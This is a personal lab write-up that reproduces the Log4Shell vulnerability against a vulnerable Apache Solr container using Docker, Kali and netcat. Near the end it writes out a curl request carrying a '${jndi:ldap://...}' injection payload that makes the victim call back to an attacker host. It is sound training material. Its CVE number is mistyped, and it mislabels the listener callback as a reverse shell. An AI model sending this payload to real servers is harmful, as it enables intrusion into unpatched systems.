## Simulating Log4Shell(CVE2021-4428) attack in Docker

This lab I am following from YouTuber Grant Collins. I tried it once & found it really fun, so I was like why not document it. 

Only 2 links we will need, 

- Docker: https://www.docker.com/products/docker-desktop/
- CodeSpace: https://github.com/features/codespaces


Once Docker is installed, run it. 

<img width="1577" height="897" alt="image" src="https://github.com/user-attachments/assets/a81f7be0-b2e2-45b2-9f3a-b3a955cd838b" />

Once it's up & running, run PowerShell as Admin & check if we are able to print Legendary `Hello-world`

`docker pull hello-world`
<img width="1105" height="206" alt="image" src="https://github.com/user-attachments/assets/7f441cef-25fe-4386-98b0-9211f0218b2d" />


That looks like success. 

Now time to deploy our containers, which will hold Ubuntu, Kali, and the Vul Solr. Later, we will update the vulnerable one with the secure one

### Deploy Ubuntu Container

Building a folder & enter into it. 
`mkdir ubunut`
`cd ubuntu`
<img width="576" height="316" alt="image" src="https://github.com/user-attachments/assets/b9371b62-5852-4b0a-9467-a4b730382746" />


Create a docker file which we will be using for docker to understand what we expect it to do. 
So we will be doing(as I am running Windows, so I will be using win commands)

`notepad Dockerfile`

This will open a notepad file & we will just post the following code, provided by Grant, but when I went through it, it was not that complex to understand
```
FROM ubuntu:24.04  
  
RUN apt-get update && \  
 apt-get install -y curl vim iputils-ping net-tools && \  
 apt-get clean  
  
CMD ["/bin/bash"]
```

<img width="652" height="417" alt="image" src="https://github.com/user-attachments/assets/e77680b2-c8cc-46f4-9c53-b6d026d471f0" />

Here, I was facing an issue as the file stored was in .txt format, during compilation it won't be able to understand our request.  

<img width="1102" height="292" alt="image" src="https://github.com/user-attachments/assets/0fb92069-978d-4581-8140-107d614153fb" />

So we have to rename the 'Dockerfile.txt' to just 'Dockerfile'

All thanks to all-mighty ChatGPT, it was easy to find how.
`ren "old_file.txt" "new_file.txt"`

<img width="665" height="492" alt="image" src="https://github.com/user-attachments/assets/05d80b2e-d0bf-4764-95fd-722ea4a3f205" />

Lets build it now
`docker build -t ubuntu .`

No errors now :)
<img width="1105" height="220" alt="image" src="https://github.com/user-attachments/assets/d4132c17-d8b6-42e1-a84d-61ca364c12c0" />

To check the available images, 
`docker images`
<img width="1101" height="192" alt="image" src="https://github.com/user-attachments/assets/1d1ef03c-b003-4b15-bc59-a30e22a2ab9c" />

To get the shell, we will use

`docker run -it --name ubuntu-container ubuntu`
<img width="750" height="57" alt="image" src="https://github.com/user-attachments/assets/ebaf6ff1-3d61-4ae1-a484-8d2fba7a1b7d" />

Finally, we are able to get our first container, which is running Ubuntu. 

## Deploy Vulnerable Apache Solr

Time to pull vulnerable Apache Solr
This is the main victim which shake the entire internet in 2021. Apache Solr is used in most of the server's backend. If something so big gets vulnerable, obviously, everyone will be nervous.
Why it was a big thing, we will discuss soon, as it was scarily easy to exploit & very damaging for any enterprise environment.

`docker pull vulhub/solr:8.11.0`

<img width="877" height="277" alt="image" src="https://github.com/user-attachments/assets/8a18f12a-56a2-4df9-96bd-5bb18f6bfa33" />


Launch the container
`docker run -d --name solr-lab -p 8983:8983 vulhub/solr:8.11.0`

where, 
-d: Runs the container in the background.
--name solr-lab: Gives your container a friendly name.
-p 8983:8983: Maps the Solr web UI to your host.

<img width="922" height="81" alt="image" src="https://github.com/user-attachments/assets/5b92efe4-e382-4ea3-901b-d990d4edc2d8" />

Once we get the hash, we can say that everything is working as expected & now we are ready to launch the vulnerable webapp
http://localhost:8983/solr/#/

And we are up & running
<img width="1917" height="903" alt="image" src="https://github.com/user-attachments/assets/62012d04-2934-47e0-8225-11bc8057c5d8" />

## Time to bring Attacker in the Ring

Just like we deployed Ubuntu using a Notepad Dockerfile, we will be getting Kali. 
```
cd ..
mkdir kali
cd kali
notepad Dockerfile

ren .\Dockerfile.txt Dockerfile
```

The content of Dockerfile will be
```
FROM kalilinux/kali-last-release:latest

ENV DEBIAN_FRONTEND=noninteractive  

RUN apt update && apt upgrade -y && \  
 apt install -y \  
 curl \  
 iputils-ping \  
 nmap \  
 netcat-traditional && \  
 apt clean && \  
 rm -rf /var/lib/apt/lists/*  
  
# Default shell when container starts  
CMD ["/bin/bash"]  
```

<img width="671" height="906" alt="image" src="https://github.com/user-attachments/assets/7355eaa3-0098-4fde-bedb-25a0b5c0d880" />

Then we will build the docker image
`docker build -t kali .`
<img width="1902" height="471" alt="image" src="https://github.com/user-attachments/assets/fe239c00-0aaa-4697-a50e-46e89a18edd0" />

Time to run the newly created image
`docker run -it --name attacker kali` 

where `-it` is interactive terminal sessions

<img width="652" height="150" alt="image" src="https://github.com/user-attachments/assets/382c814a-5262-42e5-a99f-63da9f5d9971" />


## Time for the Attack

Let's get started with the attack. 

First, confirm the available Containers using 
`docker ps`
<img width="1102" height="210" alt="image" src="https://github.com/user-attachments/assets/3ee54c19-3e5b-4b64-acb4-a0e378a43234" />


Now for the sake of simplicity & lab we will just get the IP address of both the attacker & victim. It will be easier to enumerate & make things more complex. 

Again thank to GPT, it was easy to get the IP address of solr-lab

`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' solr-lab`
<img width="1727" height="560" alt="image" src="https://github.com/user-attachments/assets/ad6fab65-5c83-4c11-9c39-7e20fe1d4387" />

Now we have the IP of both the attacker(172.17.0.3) & the victim(172.17.0.2), let's set up a reverse shell for Kali to listen to, using

`nc -lvnp 1389`

Here, port `1389` is for LDAP, which Solr was misinterpreting & that leads to exploitation of the vulnerability. 

<img width="958" height="187" alt="image" src="https://github.com/user-attachments/assets/903540b4-3578-42e4-96c0-0eb7212c8d51" />

Run the Attacker shell in another shell again. 
(I know doing cd was not necessary, but I did it anyway:P)

`docker exec -it attacker /bin/bash`
<img width="913" height="205" alt="image" src="https://github.com/user-attachments/assets/0629488e-dfa1-45c9-ae23-e1255dcdd7bb" />

Now we will need to provide the environment variables, the attacker IP & victim IP

`TARGET=172.17.0.x`

`ATTACKER=172.17.0.x`

<img width="392" height="247" alt="image" src="https://github.com/user-attachments/assets/84f1837f-5554-41d4-b06d-1baa66aaccef" />

`curl -g -v "http://$TARGET:8983/solr/admin/cores?foo=\${jndi:ldap://$ATTACKER:1389/x}"`

Here
```
curl = sends web request
-v = verbose mode
-g = so that curl will not treat { } as specail char
http://$TARGET:8983 = connect to Solr & the given IP & port, this is why we have added the TARGET ip beforehand, for the ease of execution
/solr/admin/cores = sends the request to the core API endpoint
?foo= because of its presence & web app doesn't treat the payload any differently, app will be like oh its just simple code, thats file let it pass/execute (provided the app is vul to Log4j)
${jndi:ldap://<kali-ip>:1389/x} = the real Log4j payload, which could exploit the vulnerability. Log4j try to connect to the ATTACKER IP at port 1389 (I just replaced <kali-ip> with ATTACKER )
```

Just hit enter & we got our reverse shell on our netcat listener
<img width="1825" height="397" alt="image" src="https://github.com/user-attachments/assets/d46581ed-bda9-417f-b076-800fade39fd2" />

Well, that is pretty much it for today. 

I wanted to make it an interactive reverse shell so we can get more logs to ingest in SIEM, but we will leave that for another day. 

